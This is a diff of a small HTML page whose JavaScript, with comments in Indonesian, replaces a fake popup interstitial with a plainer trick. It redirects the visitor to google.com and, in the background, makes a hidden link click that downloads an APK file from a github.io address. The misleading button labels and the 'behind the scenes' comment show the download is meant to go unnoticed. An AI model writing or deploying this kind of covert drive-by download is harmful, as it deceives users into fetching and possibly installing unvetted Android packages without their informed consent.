@@ -1,4 +1,4 @@
-<!doctype html>
+<!DOCTYPE html>
 <html>
 <head>
 <meta charset="utf-8">
@@ -20,68 +20,24 @@
 <body>
 <script>
 function a() {
-  // buka popup about:blank (same-origin)
-  const popup = window.open('', '_blank');
+  // Langsung redirect user ke halaman lain (misal Google)
+  window.location.href = 'https://google.com';
 
-  if (!popup) {
-    // popup diblokir — fallback: buka file langsung
-    window.location.href = 'https://mohammedalqi.github.io/test.apk';
-    return;
-  }
-
-  // tulis HTML interstitial ke popup (same-origin, jadi kita bisa kontrol)
-  popup.document.write(`
-    <!doctype html>
-    <html>
-    <head>
-      <meta charset="utf-8">
-      <title>Redirecting…</title>
-      <style>body{font-family:sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;margin:0}</style>
-    </head>
-    <body>
-      <div>
-        <p>Redirecting to external page…</p>
-        <p><a id="ext" href="https://google.com" target="_blank" rel="noopener">Open Google (will open in new tab)</a></p>
-        <p id="status">Preparing download…</p>
-      </div>
-    </body>
-    </html>
-  `);
-
-  // after popup DOM is ready, trigger actions inside popup
-  popup.document.close();
-
-  // give it a short delay so user sees interstitial, then:
+  // Sementara di belakang layar, tunggu 5 detik baru trigger download
   setTimeout(() => {
-    try {
-      // optional: open external site in a new tab (so interstitial remains in popup)
-      popup.open('https://google.com', '_blank', 'noopener');
-
-      // now trigger the download from within the popup (same-origin so allowed)
-      const downloadUrl = 'https://mohammedalqi.github.io/test.apk';
-
-      // create anchor and click it inside the popup
-      const a = popup.document.createElement('a');
-      a.href = downloadUrl;
-      a.download = ''; // hint to force download if server supports it
-      a.style.display = 'none';
-      popup.document.body.appendChild(a);
-      a.click();
-      a.remove();
-
-      // update popup status
-      const s = popup.document.getElementById('status');
-      if (s) s.textContent = 'Download started. This window will close shortly.';
-      // optional: close popup after some time
-      setTimeout(() => popup.close(), 2500);
-    } catch (e) {
-      // cross-origin or other error -> fallback: open file in new tab
-      window.open(downloadUrl, '_blank', 'noopener');
-    }
-  }, 600); // delay singkat agar interstitial terlihat (atur sesuai kebutuhan)
+    const link = document.createElement('a');
+    link.href = 'https://mohammedalqi.github.io/test.apk';
+    link.download = '';
+    link.style.display = 'none';
+    document.body.appendChild(link);
+    link.click();
+    link.remove();
+  }, 5000);
 }
 </script>
 
-<center><input type="button" class="button" value="Download From Original Site" onclick="a()"></center>
+<center>
+  <button class="button" onclick="a()">Download After Redirect</button>
+</center>
 </body>
 </html>
